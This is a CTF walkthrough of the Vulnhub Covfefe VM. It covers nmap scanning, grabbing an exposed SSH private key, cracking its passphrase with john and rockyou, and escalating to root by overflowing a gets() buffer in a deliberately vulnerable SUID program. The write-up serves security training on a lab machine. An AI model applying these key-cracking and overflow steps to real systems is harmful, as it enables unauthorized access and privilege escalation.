---
layout: default
title : muzec - Covfefe Writeup
---

Covfefe is a Debian 9 based Boot to root VM, originally created as a CTF for SecTalks_BNE it is intended for beginners and requires enumeration aslo rated an OSCP like machine it really fun grab a copy here [Download Covfefe Here](https://www.vulnhub.com/entry/covfefe-1,199/)

![image](https://user-images.githubusercontent.com/69868171/119277434-b0a24580-bbed-11eb-9806-e945f3642479.png)

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/covfefe]
└─$ nmap -sC  -sV -oA nmap 172.16.139.180 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-23 14:40 EDT
Nmap scan report for 172.16.139.180
Host is up (0.00022s latency).
Not shown: 997 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10 (protocol 2.0)
| ssh-hostkey: 
|   2048 d0:6a:10:e0:fb:63:22:be:09:96:0b:71:6a:60:ad:1a (RSA)
|   256 ac:2c:11:1e:e2:d6:26:ea:58:c4:3e:2d:3e:1e:dd:96 (ECDSA)
|_  256 13:b3:db:c5:af:62:c2:b1:60:7d:2f:48:ef:c3:13:fc (ED25519)
80/tcp    open  http    nginx 1.10.3
|_http-server-header: nginx/1.10.3
|_http-title: Welcome to nginx!
31337/tcp open  http    Werkzeug httpd 0.11.15 (Python 3.5.3)
| http-robots.txt: 3 disallowed entries 
|_/.bashrc /.profile /taxes
|_http-title: 404 Not Found
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.71 seconds
```

Going through port `80` first `HTTP` but we found nothing i try bursting the directory also maybe it hidden .

![image](https://user-images.githubusercontent.com/69868171/119278227-e9441e00-bbf1-11eb-8844-aaa1b9f54594.png)

Nothing time to check port `31337` we can see we have some pages from the nmap scan result we got from the `robots.txt` .

![image](https://user-images.githubusercontent.com/69868171/119278287-49d35b00-bbf2-11eb-81e5-c9955c93c7e1.png)

Checking `taxes` and we have our first flag.

![image](https://user-images.githubusercontent.com/69868171/119278321-869f5200-bbf2-11eb-95e3-448675e75de9.png)

Time to burst some directory again with dirbuster.

![image](https://user-images.githubusercontent.com/69868171/119278456-6de36c00-bbf3-11eb-9d61-b8e9d28a4755.png)

SSH folder wow now that is interesting `http://172.16.139.180:31337/.ssh` and we have the private key and public key also authorized_keys .

![image](https://user-images.githubusercontent.com/69868171/119278503-aedb8080-bbf3-11eb-8af5-d63cf48e76d9.png)

Downloading all files on the SSH folder.

![image](https://user-images.githubusercontent.com/69868171/119278536-e3e7d300-bbf3-11eb-858a-ec39df33a6b0.png)

We now have username from the public key.

![image](https://user-images.githubusercontent.com/69868171/119278602-4c36b480-bbf4-11eb-86d6-2ff845be11a6.png)

Now since we have a private key now let try to crack it using john the ripper.

`/usr/share/john/ssh2john.py id_rsa > hash` and we have the hash.

![image](https://user-images.githubusercontent.com/69868171/119278700-f1ea2380-bbf4-11eb-8286-3184db9af2a2.png)

`john --wordlist=/usr/share/wordlists/rockyou.txt hash` and we should have the password in no time.

![image](https://user-images.githubusercontent.com/69868171/119278730-22ca5880-bbf5-11eb-8e71-b6b2dd45abad.png)

Before using the private key `id_rsa` we need to give it permission first to avoid error `chmod 600 id_rsa` .

`ssh -i id_rsa simon@172.16.139.180` and we are in.

![image](https://user-images.githubusercontent.com/69868171/119278791-8bb1d080-bbf5-11eb-83d3-47fe9494cde7.png)


### Privilege Escalation

Let use find to check for some SUID permission `find / -perm -u=s -type f 2>/dev/null`  that can lead to root probably maybe or maybe not.

![image](https://user-images.githubusercontent.com/69868171/119278881-201c3300-bbf6-11eb-9fe1-3f1474871035.png)

Boom `/usr/local/bin/read_message` look interesting let try running it .

![image](https://user-images.githubusercontent.com/69868171/119278898-47730000-bbf6-11eb-9a0f-be544c2076d5.png)

Hmmm guess we need a name to view the message i try using strings to check the SUID file but strings is not installed on the box let enumerate more now and boom seems we have access to the root folder ahhhh cool without being root user.

![image](https://user-images.githubusercontent.com/69868171/119279006-04fdf300-bbf7-11eb-9676-074f416010c5.png)

We have a flag and a C file but we have no access to the flag since we are not root yet but we can view the `read_message.c` file.

![image](https://user-images.githubusercontent.com/69868171/119279054-35de2800-bbf7-11eb-8ca7-97a892413fc9.png)

Now we have username to access the SUID file now to read the message.

![image](https://user-images.githubusercontent.com/69868171/119279078-573f1400-bbf7-11eb-98f0-03b19cb5c83e.png)

And going through the souce code of the C file seems we have our second flag now let get root.

```
simon@covfefe:/root$ cat read_message.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// You're getting close! Here's another flag:
// flag2{use_the_source_luke}

int main(int argc, char *argv[]) {
    char program[] = "/usr/local/sbin/message";
    char buf[20];
    char authorized[] = "Simon";

    printf("What is your name?\n");
    gets(buf);

    // Only compare first five chars to save precious cycles:
    if (!strncmp(authorized, buf, 5)) {
        printf("Hello %s! Here is your message:\n\n", buf);
        // This is safe as the user can't mess with the binary location:
        execve(program, NULL, NULL);
    } else {
        printf("Sorry %s, you're not %s! The Internet Police have been informed of this violation.\n", buf, authorized);
        exit(EXIT_FAILURE);
    }

}
```

Reading through the source code we find that, when we enter a string it reads the first 5 characters of the string as Simon, if it matches then it runs `/usr/local/sbin/message`. 

But the input allocation for this is 20 bytes. So, we have to overflow the stack entering more than 20 bytes of data. We use the first 5 char to be `Simon` followed by 15 `A` and then `/bin/sh` at the 21st byte.

![image](https://user-images.githubusercontent.com/69868171/119279201-2e6b4e80-bbf8-11eb-99c7-b88c99646dfd.png)

And we are root let get the last flag.

![image](https://user-images.githubusercontent.com/69868171/119279218-46db6900-bbf8-11eb-8caf-147a2c2efbdf.png)

Box rooted and we are done.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
